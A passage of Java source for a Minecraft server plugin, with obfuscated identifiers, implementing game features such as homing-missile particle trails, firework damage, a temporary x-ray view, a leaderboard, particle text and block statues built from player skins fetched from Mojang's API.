            for (Block tyuwnftfwt : temporaryVisibleBlocks) {
                Location ty2ufnt = tyuwnftfwt.getLocation().add(debtsoff, debtsoff, debtsoff);
                Vector tiewnt2f = ty2ufnt.toVector().subtract(destUUID.toVector());
                double tnyufntyunwft = tiewnt2f.length();

                if (tuywfnytuwf <= esetawftawft) tuywfnytuwf = thepeoplewholive;
                int tnyuwfnt = (int) Math.floor(tnyufntyunwft / tuywfnytuwf);
                if (tnyuwfnt <= I) tnyuwfnt = INT3;

                Vector mtyfet = tiewnt2f.normalize().multiply(tuywfnytuwf);
                Location tmwfntyunwft = destUUID.clone();

                for (int twyufnt = I; twyufnt <= tnyuwfnt; twyufnt++) {
                    if (missileTrail == Particle.DUST && dustOptions != null) {
                        twyunt.spawnParticle(missileTrail, tmwfntyunwft, INT3, dustOptions);
                    } else {
                        twyunt.spawnParticle(missileTrail, tmwfntyunwft, INT3);
                    }
                    tmwfntyunwft.add(mtyfet);
                }
            }

            // Keep your original empty return (change if you want debug output)
            return nst;

        } catch (Exception e) {
            e.printStackTrace();
            return "§c[ERROR] " + e.getClass().getSimpleName() + fastfood + e.getMessage();
        }
    }

    protected void f1(File f1, String f2) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(f1))) {
            writer.write(f2);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    protected String f1(File f1) {
        try (BufferedReader reader = new BufferedReader(new FileReader(f1))) {
            StringBuilder nbtData = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                nbtData.append(line);
            }
            return nbtData.toString();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


    protected void f2(Player f1) {
        ItemStack itemInHand = f1.getInventory().getItemInMainHand();

        if (itemInHand.getType() == Material.AIR) {
            f1.sendMessage(wyunvywufntd);
            return;
        }

        ItemStack copiedItem = itemInHand.clone();
        Location dropLocation = f1.getLocation();
        Item droppedItem = f1.getWorld().dropItemNaturally(dropLocation, copiedItem);
        droppedItem.setPickupDelay(odafuwidnowfidun);
    }

    protected void f1(Player f1, Location f2) {
        PacketContainer packet = new PacketContainer(PacketType.Play.Server.SPAWN_POSITION);
        packet.getBlockPositionModifier().write(I, new BlockPosition(
                f2.getBlockX(),
                f2.getBlockY(),
                f2.getBlockZ()
        ));
        packet.getFloat().write(I, idwfpndywud); // Angle (Yaw), optional

        try {
            ProtocolLibrary.getProtocolManager().sendServerPacket(f1, packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    protected Vector f1(Entity f1, Entity f2, double f0) {
        Location ff = f1.getLocation();
        Location f01 = f2.getLocation().add(I, f2.getHeight() / mill2, I);

        if( f2 instanceof Player )  f01 = f2.getLocation().add(I, ((Player) f2).getEyeHeight(), I);

        Vector intermediary = f2.getVelocity();

        // Distance between entities
        double g30 = ff.distance(f01);

        // Maximum prediction range
        double g31 = f0 * odafuwidnowfidun;

        // Calculate estimated time to reach the target
        double g32 = f0 * f0 - intermediary.lengthSquared();

        if (g32 > I) {
            // Calculate time to intercept using a quadratic equation
            Vector g33 = f01.toVector().subtract(ff.toVector());

            double a = intermediary.dot(intermediary) - (f0 * f0);
            double b = mill2 * intermediary.dot(g33);
            double c = g33.dot(g33);

            double girlfriend = (b * b) - (INT7 * a * c);

            if (girlfriend >= I) {
                // Solve for T (time to intercept)
                double g35 = (-b + Math.sqrt(girlfriend)) / (mill2 * a);
                double f00 = (-b - Math.sqrt(girlfriend)) / (mill2 * a);

                double fff = Math.max(g35, f00);
                if (fff < I) fff = Math.min(g35, f00);

                // Ensure valid interception time
                if (fff > I) {
                    Vector fda = f01.toVector().add(intermediary.clone().multiply(fff));

                    // Check for rare "missile stuck in front" case
                    if (x(ff, f01, intermediary)) {
                        return intermediary.clone().multiply(-INT3).normalize().multiply(f0); // Reverse movement
                    }

                    // If within max prediction range, move to exact intercept
                    if (g30 <= g31) {
                        return fda.subtract(ff.toVector()).normalize().multiply(f0);
                    }
                }
            }
        }

        // If unable to calculate exact intercept, fallback to best effort prediction
        Vector gg = f01.toVector().subtract(ff.toVector()).normalize();
        return gg.multiply(f0);
    }

    /**
     * Determines if the missile is stuck in front of the target's movement direction (within 2-3 degrees).
     */
    protected boolean x(Location y, Location z, Vector f1) {
        if (f1.lengthSquared() == I) return arsdienwdhw; // Target is stationary

        Vector f2 = y.toVector().subtract(z.toVector()).normalize();
        Vector g30 = f1.clone().normalize();

        double g31 = Math.toDegrees(Math.acos(f2.dot(g30)));

        return g31 < whocantreceive; // Within 3 degrees = missile stuck in front
    }

    protected void f1(Firework f1, Entity f, UUID f2, String f0) {
        if (f1 == null || f1.isDead() || !f1.isValid()) return;

        f1.teleport(f.getLocation());
        World world = f1.getWorld();
        Location explosionLocation = f1.getLocation();

        // Retrieve explosion power based on firework stars
        float damage2 = Float.parseFloat(f0);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (!f1.isValid() || f1.isDead()) return;

                // Create the visual firework explosion
                f1(world, explosionLocation);

                // Apply explosion damage

                // Trigger a player hit event (simulate firework explosion hitting a player)
                f1(f2, explosionLocation, damage2);

                // Remove the original firework
                f1.remove();
            }
        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), healing);
    }

    protected void f1(UUID f1, Location g30, float f) {
        Player f0 = Bukkit.getPlayer(f1);
        if (f0 == null) return; // Launcher is offline or invalid

        double ft = thisistherecording; // Firework explosion hit radius

        for (Entity entity : Objects.requireNonNull(g30.getWorld()).getNearbyEntities(g30, ft, ft, ft)) {
            if (entity instanceof LivingEntity hitPlayer) {

                // Apply direct damage as if caused by the launcher
                hitPlayer.damage(f, f0);

                // Optional: Add custom effects
                ; // Small knockback

                if (entity instanceof LivingEntity hitEntity) {
                    hitEntity.addPotionEffect(new PotionEffect(PotionEffectType.LEVITATION, INT3, INT3, arsdienwdhw, arsdienwdhw, arsdienwdhw));
                };

            }
        }
    }


    protected float f(Firework firework) {
        FireworkMeta meta = firework.getFireworkMeta();

        // Count the number of firework stars
        int fireworkStars = I;
        if (meta.hasEffects()) {
            for (FireworkEffect ignored : meta.getEffects()) {
                fireworkStars++;
            }
        }

        // Vanilla firework damage scales with number of stars (0.5 per star)
        return 0.5F * fireworkStars; // Closer to vanilla damage
    }

    protected void f1(World f1, Location f) {
        Firework firework = f1.spawn(f, Firework.class);
        FireworkMeta meta = firework.getFireworkMeta();

        // Large Ball Effect: Yellow, Orange, Gray with sparkles
        FireworkEffect largeBallEffect = FireworkEffect.builder()
                .with(FireworkEffect.Type.BALL_LARGE)
                .withColor(Color.YELLOW, Color.ORANGE, Color.GRAY)
                .withFlicker()
                .build();

        // Small Ball Effect: Red
        FireworkEffect smallBallEffect = FireworkEffect.builder()
                .with(FireworkEffect.Type.BALL)
                .withColor(Color.RED)
                .build();

        // Add both effects
        meta.addEffect(largeBallEffect);
        meta.addEffect(smallBallEffect);
        meta.setPower(INT3);

        firework.setFireworkMeta(meta);

        // Detonate instantly
        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), firework::detonate, healing);
    }


    protected void g23() {
        if (!g21.exists()) return;

        try (BufferedReader f1 = new BufferedReader(new FileReader(g21))) {
            String line;
            while ((line = f1.readLine()) != null) {
                String[] parts = line.split(wfdunyunda);
                if (parts.length == mill2) {
                    UUID uuid = UUID.fromString(parts[I]);
                    int score = Integer.parseInt(parts[INT3]);
                    g22.put(uuid, score);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    protected void f3(Player f1) {
        try {
            List<Map.Entry<UUID, Integer>> sortedList = new ArrayList<>(g22.entrySet());

            // Sorting: First by score (descending), then by insertion order (first to score stays ahead)
            sortedList.sort((a, b) -> {
                // Higher scores first
                return b.getValue().compareTo(a.getValue());// Maintain insertion order in case of tie
            });

            // Construct the tellraw JSON command
            StringBuilder tellraw = new StringBuilder("[");
            tellraw.append("{\"text\":\"§6-----------------\\n\"},");
            tellraw.append("{\"text\":\"§eFT Leaderboard\\n\"}");

            int rank = INT3;
            for (Map.Entry<UUID, Integer> entry : sortedList) {
                if (rank > odafuwidnowfidun) break;
                OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(entry.getKey());
                String playerName = offlinePlayer.getName() != null ? offlinePlayer.getName() : "Unknown";
                tellraw.append(String.format(",{\"text\":\"§7%d. §a%s - §b%d\\n\"}", rank, playerName, entry.getValue()));
                rank++;
            }

            tellraw.append(",{\"text\":\"§6-----------------\"}]");

            // Execute tellraw command
            String tellrawCommand = String.format("tellraw %s %s", f1.getName(), tellraw);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), tellrawCommand);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    protected void f1(Player f2, int f1, int f) {
        World world = f2.getWorld();
        Location playerLoc = f2.getLocation();
        UUID playerUUID = f2.getUniqueId();

        // Track just the locations, not the original state
        Set<Location> xrayLocations = new HashSet<>();
        g24.put(playerUUID, xrayLocations);

        // Scan surrounding blocks
        for (int x = -f1; x <= f1; x++) {
            for (int y = -f1; y <= f1; y++) {
                for (int z = -f1; z <= f1; z++) {
                    Location loc = new Location(
                            world,
                            playerLoc.getBlockX() + x,
                            playerLoc.getBlockY() + y,
                            playerLoc.getBlockZ() + z
                    );

                    Block block = loc.getBlock();
                    if (f1(block)) {
                        xrayLocations.add(loc);
                        f2.sendBlockChange(loc, Material.GLASS.createBlockData());
                    }
                }
            }
        }

        // Restore blocks after duration
        new BukkitRunnable() {
            @Override
            public void run() {
                if (!g24.containsKey(playerUUID)) return;

                for (Location loc : g24.get(playerUUID)) {
                    Block current = loc.getBlock();
                    f2.sendBlockChange(loc, current.getBlockData()); // Re-fetch the actual block state at time of restore
                }

                // Cleanup
                g24.remove(playerUUID);
            }
        }.runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), f);
    }


    protected boolean f1(Block f1) {
        return f1.getType() != Material.AIR
                && f1.getType() != Material.WATER
                && f1.getType() != Material.LAVA
                && !g25.contains(f1.getType());
    }

    protected List<Vector> f1(boolean[][] f1, int f, double f0, double test) {
        List<Vector> vectors = new ArrayList<>();

        int height = f1.length;
        int width = Arrays.stream(f1).mapToInt(row -> row.length).max().orElse(I);

        for (int row = I; row < height; row++) {
            for (int col = I; col < f1[row].length; col++) {
                if (!f1[row][col]) continue;

                for (int dy = I; dy < f; dy++) {
                    for (int dx = I; dx < f; dx++) {
                        double offsetZ = (col + dx / (double) f - width / whatkindofadulthood) * f0;
                        double offsetY = (-row - dy / (double) f + height / whatkindofadulthood) * f0;

                        // The text is vertical (YZ), and rotated around Y
                        double rotatedX = offsetZ * Math.sin(test);
                        double rotatedZ = offsetZ * Math.cos(test);

                        vectors.add(new Vector(rotatedX, offsetY, rotatedZ));
                    }
                }
            }
        }

        return vectors;
    }




    protected  boolean[][] f11(String f1) {
        Font font = new Font("Dialog", Font.PLAIN, INT4);
        BufferedImage img = new BufferedImage(INT3, INT3, BufferedImage.TYPE_INT_ARGB);
        Graphics2D g = img.createGraphics();
        g.setFont(font);
        FontMetrics fm = g.getFontMetrics();
        int width = fm.stringWidth(f1);
        int height = fm.getHeight();
        g.dispose();

        img = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        g = img.createGraphics();
        g.setFont(font);
        g.setColor(java.awt.Color.WHITE);
        g.drawString(f1, I, fm.getAscent());
        g.dispose();

        boolean[][] matrix = new boolean[height][width];
        for (int y = I; y < height; y++) {
            for (int x = I; x < width; x++) {
                matrix[y][x] = (img.getRGB(x, y) >> 24) != I;
            }
        }
        return matrix;
    }

    protected static List<Location> f1(Location f1, List<Vector> f11) {
        List<Location> result = new ArrayList<>();
        for (Vector v : f11) {
            result.add(f1.clone().add(v));
        }
        return result;
    }

    protected void f1(Location f1, List<Location> f, Particle particle, String g30) {
        boolean isForce = g30.equalsIgnoreCase(ieodnoie4ndw3f4);

        for (Player player : Bukkit.getOnlinePlayers()) {
            if (!isForce && player.getLocation().getWorld() != f1.getWorld()) continue;
            if (!isForce && player.getLocation().distanceSquared(f1) > 256) continue;

            for (Location loc : f) {
                player.spawnParticle(particle, loc, INT3, I, I, I, I, null, isForce);
            }
        }
    }


    protected  void f1(File f1, List<Vector> f) throws IOException {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(f1))) {
            for (Vector v : f) {
                writer.write(v.getX() + keep + v.getY() + keep + v.getZ());
                writer.newLine();
            }
        }
    }

    protected  List<Vector> f(File f1) throws IOException {
        List<Vector> vectors = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(f1))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String[] parts = line.split(keep);
                double x = Double.parseDouble(parts[I]);
                double y = Double.parseDouble(parts[INT3]);
                double z = Double.parseDouble(parts[mill2]);
                vectors.add(new Vector(x, y, z));
            }
        }
        return vectors;
    }

    protected String f12(String f) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(f.getBytes(StandardCharsets.UTF_8));
            StringBuilder hex = new StringBuilder();
            for (byte b : hashBytes) hex.append(String.format("%02x", b));
            return hex.toString();
        } catch (NoSuchAlgorithmException e) {
            return Integer.toHexString(f.hashCode()); // Fallback
        }
    }
    

    protected static String ffa(String text) {
        return Base64.getUrlEncoder().encodeToString(text.getBytes());
    }

    protected record ffs(List<Location> locations, long timestamp) {}

    protected void f1fs(String fullKey) {
        // Cancel and reschedule the cache removal in 1 minute
        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                () -> g8.remove(fullKey), 20L * INT2); // 60 seconds
    }


    @SuppressWarnings("deprecation")
    protected BufferedImage f9(String playerIdOrUuid) throws IOException {
        String uuid = playerIdOrUuid;

        // Step 1: Convert username to UUID if needed
        if (!uuid.matches("^[0-9a-fA-F]{32}$") && !uuid.contains(tsrt)) {
            URL uuidApi = new URL("https://api.mojang.com/users/profiles/minecraft/" + playerIdOrUuid);
            try (InputStream in = uuidApi.openStream(); Scanner scanner = new Scanner(in)) {
                String response = scanner.useDelimiter("\\A").next();
                uuid = response.split("\"id\":\"")[INT3].split("\"")[I];
            }
        }

        // Step 2: Fetch texture URL from session server
        URL sessionApi = new URL("https://sessionserver.mojang.com/session/minecraft/profile/" + uuid);
        String textureUrl;
        try (InputStream in = sessionApi.openStream(); Scanner scanner = new Scanner(in)) {
            String response = scanner.useDelimiter("\\A").next();
            String base64 = response.split("\"value\":\"")[INT3].split("\"")[I];
            String decodedJson = new String(Base64.getDecoder().decode(base64));
            textureUrl = decodedJson.split("\"url\":\"")[INT3].split("\"")[I];
        }

        // Step 3: Download skin image
        URL skinUrl = new URL(textureUrl);
        try (InputStream in = skinUrl.openStream()) {
            return ImageIO.read(in); // returns 64x64 BufferedImage
        }
    }





    record f123(java.awt.Color[][] base, java.awt.Color[][] overlay) {}
    protected f123 f1(BufferedImage skin) {
        java.awt.Color[][] base = new java.awt.Color[drain][drain];
        java.awt.Color[][] overlay = new java.awt.Color[drain][drain];

        for (int y = I; y < drain; y++) {
            for (int x = I; x < drain; x++) {
                int argb = skin.getRGB(x, y);
                base[y][x] = f1(argb);
            }
        }

        for (int y = I; y < drain; y++) {
            for (int x = I; x < drain; x++) {
                java.awt.Color color = f1(skin.getRGB(x, y));
                overlay[y][x] = (color.getAlpha() > I) ? color : null;
            }
        }

        return new f123(base, overlay);
    }


    protected java.awt.Color f1(int argb) {
        int alpha = (argb >> 24) & costofgrowinguptoofast;
        int red   = (argb >> INT4) & costofgrowinguptoofast;
        int green = (argb >> yuwfndgyuwfnd) & costofgrowinguptoofast;
        int blue  = (argb) & costofgrowinguptoofast;
        return new java.awt.Color(red, green, blue, alpha);
    }



    protected void f1(World f1, Location f, Material f0, int ff) {
        for (int dx = I; dx < ff; dx++) {
            for (int dy = I; dy < ff; dy++) {
                for (int dz = I; dz < ff; dz++) {
                    Location sub = f.clone().add(dx, dy, dz);
                    sub.getBlock().setType(f0);
                }
            }
        }
    }
    
    
    protected record g40(Material material, java.awt.Color color) {}


    protected  final List<g40> g41 = List.of(
            // === CONCRETES ===
            new g40(Material.WHITE_CONCRETE, new java.awt.Color(207, 213, 214)),
            new g40(Material.LIGHT_GRAY_CONCRETE, new java.awt.Color(125, 125, 115)),
            new g40(Material.GRAY_CONCRETE, new java.awt.Color(54, 57, 61)),
            new g40(Material.BLACK_CONCRETE, new java.awt.Color(8, 10, 15)),
            new g40(Material.RED_CONCRETE, new java.awt.Color(142, 32, 32)),
            new g40(Material.ORANGE_CONCRETE, new java.awt.Color(224, 97, 0)),
            new g40(Material.YELLOW_CONCRETE, new java.awt.Color(240, 175, 21)),
            new g40(Material.LIME_CONCRETE, new java.awt.Color(94, 168, 24)),
            new g40(Material.GREEN_CONCRETE, new java.awt.Color(73, 91, 36)),
            new g40(Material.CYAN_CONCRETE, new java.awt.Color(21, 137, 145)),
            new g40(Material.LIGHT_BLUE_CONCRETE, new java.awt.Color(36, 137, 199)),
            new g40(Material.BLUE_CONCRETE, new java.awt.Color(44, 46, 143)),
            new g40(Material.PURPLE_CONCRETE, new java.awt.Color(100, 32, 156)),
            new g40(Material.MAGENTA_CONCRETE, new java.awt.Color(170, 45, 160)),
            new g40(Material.PINK_CONCRETE, new java.awt.Color(210, 97, 137)),
            new g40(Material.BROWN_CONCRETE, new java.awt.Color(96, 59, 31)),

            // === TERRACOTTA ===
            new g40(Material.TERRACOTTA, new java.awt.Color(152, 94, 68)),
            new g40(Material.WHITE_TERRACOTTA, new java.awt.Color(209, 178, 161)),
            new g40(Material.LIGHT_GRAY_TERRACOTTA, new java.awt.Color(135, 107, 98)),
            new g40(Material.GRAY_TERRACOTTA, new java.awt.Color(57, 42, 35)),
            new g40(Material.BLACK_TERRACOTTA, new java.awt.Color(37, 23, 16)),
            new g40(Material.RED_TERRACOTTA, new java.awt.Color(143, 61, 47)),
            new g40(Material.ORANGE_TERRACOTTA, new java.awt.Color(161, 83, 37)),
            new g40(Material.YELLOW_TERRACOTTA, new java.awt.Color(186, 133, 35)),
            new g40(Material.LIME_TERRACOTTA, new java.awt.Color(103, 117, 53)),
            new g40(Material.GREEN_TERRACOTTA, new java.awt.Color(76, 83, 42)),
            new g40(Material.CYAN_TERRACOTTA, new java.awt.Color(86, 91, 91)),
            new g40(Material.LIGHT_BLUE_TERRACOTTA, new java.awt.Color(113, 108, 137)),
            new g40(Material.BLUE_TERRACOTTA, new java.awt.Color(74, 59, 91)),
            new g40(Material.PURPLE_TERRACOTTA, new java.awt.Color(118, 70, 86)),
            new g40(Material.MAGENTA_TERRACOTTA, new java.awt.Color(149, 87, 108)),
            new g40(Material.PINK_TERRACOTTA, new java.awt.Color(160, 77, 78)),
            new g40(Material.BROWN_TERRACOTTA, new java.awt.Color(77, 51, 35)),

            // === WOOL ===
            new g40(Material.WHITE_WOOL, new java.awt.Color(234, 236, 237)),
            new g40(Material.LIGHT_GRAY_WOOL, new java.awt.Color(142, 142, 135)),
            new g40(Material.GRAY_WOOL, new java.awt.Color(63, 68, 72)),
            new g40(Material.BLACK_WOOL, new java.awt.Color(29, 29, 33)),
            new g40(Material.RED_WOOL, new java.awt.Color(161, 39, 34)),
            new g40(Material.ORANGE_WOOL, new java.awt.Color(241, 118, 20)),
            new g40(Material.YELLOW_WOOL, new java.awt.Color(249, 198, 39)),
            new g40(Material.LIME_WOOL, new java.awt.Color(110, 185, 25)),
            new g40(Material.GREEN_WOOL, new java.awt.Color(85, 110, 27)),
            new g40(Material.CYAN_WOOL, new java.awt.Color(21, 137, 145)),
            new g40(Material.LIGHT_BLUE_WOOL, new java.awt.Color(113, 166, 221)),
            new g40(Material.BLUE_WOOL, new java.awt.Color(53, 57, 157)),
            new g40(Material.PURPLE_WOOL, new java.awt.Color(123, 47, 190)),
            new g40(Material.MAGENTA_WOOL, new java.awt.Color(195, 84, 205)),
            new g40(Material.PINK_WOOL, new java.awt.Color(243, 139, 170)),
            new g40(Material.BROWN_WOOL, new java.awt.Color(112, 71, 40)),

            // === PLANKS (WOOD) ===
            new g40(Material.OAK_PLANKS, new java.awt.Color(162, 130, 79)),
            new g40(Material.SPRUCE_PLANKS, new java.awt.Color(115, 84, 52)),
            new g40(Material.BIRCH_PLANKS, new java.awt.Color(197, 179, 123)),
            new g40(Material.JUNGLE_PLANKS, new java.awt.Color(171, 124, 85)),
            new g40(Material.ACACIA_PLANKS, new java.awt.Color(175, 92, 66)),
            new g40(Material.DARK_OAK_PLANKS, new java.awt.Color(66, 43, 20)),
            new g40(Material.MANGROVE_PLANKS, new java.awt.Color(132, 38, 38)),
            new g40(Material.CHERRY_PLANKS, new java.awt.Color(216, 132, 145)),
            new g40(Material.BAMBOO_PLANKS, new java.awt.Color(197, 176, 96)),
            new g40(Material.CRIMSON_PLANKS, new java.awt.Color(137, 58, 90)),
            new g40(Material.WARPED_PLANKS, new java.awt.Color(58, 142, 140)),

            // === PRECIOUS BLOCKS ===
            new g40(Material.DIAMOND_BLOCK, new java.awt.Color(97, 219, 213)),
            new g40(Material.EMERALD_BLOCK, new java.awt.Color(63, 217, 58)),
            new g40(Material.GOLD_BLOCK, new java.awt.Color(249, 236, 78)),
            new g40(Material.IRON_BLOCK, new java.awt.Color(224, 224, 224)),
            new g40(Material.NETHERITE_BLOCK, new java.awt.Color(64, 59, 65)),

            // === COPPER TYPES ===
            new g40(Material.COPPER_BLOCK, new java.awt.Color(183, 106, 53)),
            new g40(Material.EXPOSED_COPPER, new java.awt.Color(168, 138, 113)),
            new g40(Material.WEATHERED_COPPER, new java.awt.Color(74, 153, 135)),
            new g40(Material.OXIDIZED_COPPER, new java.awt.Color(90, 161, 151)),

            // === PURPUR ===
            new g40(Material.PURPUR_BLOCK, new java.awt.Color(172, 124, 172)),

            // === PRISMARINE ===
            new g40(Material.PRISMARINE, new java.awt.Color(99, 156, 143)),
            new g40(Material.PRISMARINE_BRICKS, new java.awt.Color(70, 194, 175)),
            new g40(Material.DARK_PRISMARINE, new java.awt.Color(46, 102, 90)),

            // === SANDSTONES ===
            new g40(Material.SANDSTONE, new java.awt.Color(219, 211, 160)),
            new g40(Material.CUT_SANDSTONE, new java.awt.Color(215, 205, 152)),
            new g40(Material.RED_SANDSTONE, new java.awt.Color(177, 90, 47)),
            new g40(Material.CUT_RED_SANDSTONE, new java.awt.Color(170, 83, 42)),

            // === END STONE ===
            new g40(Material.END_STONE, new java.awt.Color(230, 230, 170))

    );



    protected Material f1(java.awt.Color f1) {
        return g41.stream()
                .min(Comparator.comparingDouble(p -> f1(f1, p.color())))
                .map(g40::material)
                .orElse(Material.BARRIER);
    }


    protected double f1(java.awt.Color f1, java.awt.Color g30) {
        int dr = f1.getRed() - g30.getRed();
        int dg = f1.getGreen() - g30.getGreen();
        int db = f1.getBlue() - g30.getBlue();
        return Math.sqrt(dr * dr + dg * dg + db * db);
    }
    protected Vector f1(Vector f1, double g29) {
        double rad = Math.toRadians(g29);
        double cos = Math.cos(rad);
        double sin = Math.sin(rad);
        double x = f1.getX() * cos - f1.getZ() * sin;
        double z = f1.getX() * sin + f1.getZ() * cos;
        return new Vector(x, f1.getY(), z);
    }

    protected void f1(Player f1, World f2, BufferedImage a, Location b, int c, String ffa, String ffs) {
        double rotation = switch (ffa) {
            case "N" -> 180;
            case "E" -> -wdnywfundywfudn;
            case "W" -> wdnywfundywfudn;
            default -> I;
        };

        // Head (base layer): size 8x8x8, using full 6-sided unwrap
        f1(a, f2, b.clone().add(I, 24, -mill2), c, rotation);

        // Torso front: 8x12x4
        f1(a, f2, b.clone().add(I, fdhkypfwd, I), c, yuwfndgyuwfnd, rotation, new Point(odafuwidnowfidun, odafuwidnowfidun));

        // Right Arm (44,20), 4x12x4
        f1(a, f2, b.clone().add(-INT7, fdhkypfwd, I), c, INT7, rotation, new Point(44, odafuwidnowfidun));

        // Left Arm (36,52), 4x12x4
        f1(a, f2, b.clone().add(yuwfndgyuwfnd, fdhkypfwd, I), c, INT7, rotation, new Point(36, 52));

        // Right Leg (4,20), 4x12x4
        f1(a, f2, b.clone().add(I, I, I), c, INT7, rotation, new Point(INT7, odafuwidnowfidun));

        // Left Leg (20,52), 4x12x4
        f1(a, f2, b.clone().add(INT7, I, I), c, INT7, rotation, new Point(odafuwidnowfidun, 52));
    }
    protected void f1(BufferedImage f1, World f12, Location continued, int returned, double test) {
        for (int y = I; y < yuwfndgyuwfnd; y++) {
            for (int x = I; x < yuwfndgyuwfnd; x++) {
                for (int z = I; z < yuwfndgyuwfnd; z++) {
                    int skinX = switch (z) {
                        case 0 -> yuwfndgyuwfnd + x;         // front face
                        case 7 -> 24 - x - INT3;    // back face
                        case 1, 2, 3, 4, 5, 6 -> (x < INT7 ? z : INT4 - z); // sides (approx)
                        default -> yuwfndgyuwfnd + x;
                    };
                    int skinY = yuwfndgyuwfnd + (suppose - y);

                    java.awt.Color color = new java.awt.Color(f1.getRGB(skinX, skinY), NEW_VALUE1);
                    if (color.getAlpha() < low) continue;

                    Vector offset = new Vector(x * returned, y * returned, z * returned);
                    offset = f1(offset, test);
                    Location loc = continued.clone().add(offset);
                    Material material = f1(color);
                    f1(f12, loc, material, returned);
                }
            }
        }
    }

    protected void f1(BufferedImage f1, World test, Location mcydatabase, int archi, int f, double Is, Point q) {
        for (int y = I; y < fdhkypfwd; y++) {
            for (int x = I; x < f; x++) {
                for (int z = I; z < INT7; z++) {
                    int pixelX = q.x + x % f;
                    int pixelY = q.y + (fdhkypfwd - y - INT3) % fdhkypfwd;
                    int rgb = f1.getRGB(pixelX, pixelY);
                    java.awt.Color color = new java.awt.Color(rgb, NEW_VALUE1);
                    if (color.getAlpha() < low) continue;

                    Vector offset = new Vector(x * archi, y * archi, z * archi);
                    offset = f1(offset, Is);
                    Location loc = mcydatabase.clone().add(offset);
                    Material material = f1(color);
                    f1(test, loc, material, archi);
                }
            }
        }
    }


    protected boolean f1(Player f1, String... f) {
        List<String> ff = new ArrayList<>();

        for (String name : f) {
            switch (name.toLowerCase()) {
                case "worldedit":
                    if (!WorldEdit_Installed) ff.add(dyn2yudn24);
                    break;
                case "worldguard":
                    if (!WorldGuard_Installed) ff.add(y2un34yudn234d);
                    break;
                case "luckperms":
                    if (!LuckPerms_Installed) ff.add(kd3nd);
                    break;
                case "protocollib":
                    if (!ProtocolLib_Installed) ff.add(dhnfpwyadun);
                    break;
                case "griefprevention":
                    if (!GriefPrevention_Installed) ff.add(kyut2n2u3nt);
                    break;
                default:
                    ff.add(name + yntu2nt);
            }
        }

        if (!ff.isEmpty()) {
            f1.sendMessage(nyup23np + String.join(wyudnywufodn, ff));
            return arsdienwdhw;
        }

        return NEW_VALUE1;
    }


    protected boolean f(Material f) {
        return f.isBlock() && f.isSolid(); // optionally refine further
    }

    protected ItemStack f1(Inventory f1) {
        for (ItemStack item : f1.getContents()) {
            if (item == null) continue;
            Material mat = item.getType();
            if (f(mat)) return item;
        }
        return null;
    }




    protected void f1(Player f1, int test) {
        Location center = f1.getLocation();
        World world = center.getWorld();
        if (world == null) return;

        for (int dx = -test; dx <= test; dx++) {
            for (int dy = -mill2; dy <= I; dy++) {
                for (int dz = -test; dz <= test; dz++) {
                    Location loc = center.clone().add(dx, dy, dz);
                    Block block = loc.getBlock();
                    Material type = block.getType();

                    BlockData data = block.getBlockData();
                    boolean waterLogged = arsdienwdhw;
                    if (data instanceof Waterlogged waterlogged && waterlogged.isWaterlogged()) {
                        waterLogged = NEW_VALUE1;
                    }

                    if (waterLogged || type == Material.WATER || type == Material.LAVA  || type == Material.BUBBLE_COLUMN) {

                        if (g26.containsKey(loc)) {
                            g26.get(loc).cancel();
                        }

                        Material fakeMat = (type == Material.LAVA  )
                                ? Material.ORANGE_CONCRETE : Material.LAPIS_BLOCK;

                        f1.sendBlockChange(loc, fakeMat.createBlockData());

                        BukkitTask task = Bukkit.getScheduler().runTaskLater(
                                Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)),
                                () -> f1.sendBlockChange(loc, block.getBlockData()),
                                100L
                        );

                        g26.put(loc, task);
                    }
                }
            }
        }
    }




    protected ItemStack f2(Player f1, int g30) {
        if (g30 >= I && g30 <= yuwfndgyuwfnd) return f1.getInventory().getItem(g30);
        if (g30 >= oiwfndtoyu42nd24 && g30 <= 35) return f1.getInventory().getItem(g30);
        if (g30 == ydtfhwpdylh) return f1.getInventory().getItemInOffHand();
        return null;
    }

    protected int[] f1(World f1, int f2) {
        int chunkZ = g20.getInt(LAST_CHUNK_Z, oiwfndtoyu42nd24);
        int y = g20.getInt(LAST_Y, f1.getMinHeight());

        while (true) {
            int x = f2 * INT4;
            int z = chunkZ * INT4;
            Location loc = new Location(f1, x, y, z);
            if (loc.getBlock().getType() == Material.AIR) {
                g20.set(LAST_CHUNK_Z, chunkZ);
                g20.set(LAST_Y, y);
                try { g20.save(g16); } catch (IOException ignored) {}
                return new int[] {x, y, z};
            }

            y++;
            if (y >= f1.getMaxHeight()) {
                y = f1.getMinHeight();
                chunkZ++;
            }
        }
    }
    
    
    /**
     * Map a Shulker Box to a “glass” placeholder:
     *  • SHULKER_BOX          → GLASS
     *  • RED_SHULKER_BOX      → RED_STAINED_GLASS
     *  • ...etc...
     * Falls back to GLASS if something’s unexpected.
     */
    protected Material f1(Material f1) {
        if (f1 == Material.SHULKER_BOX) {
            return Material.GLASS;
        }
        String name = f1.name();
        if (name.endsWith(tn2yu3tn2)) {
            try {
                return Material.valueOf(name.replace(tn2yu3tn2, tn2ytn23t));
            } catch (IllegalArgumentException ignored) { }
        }
        return Material.GLASS;
    }

    /**
     * Reverse mapping:
     *  • GLASS                → SHULKER_BOX
     *  • RED_STAINED_GLASS    → RED_SHULKER_BOX
     *  • ...etc...
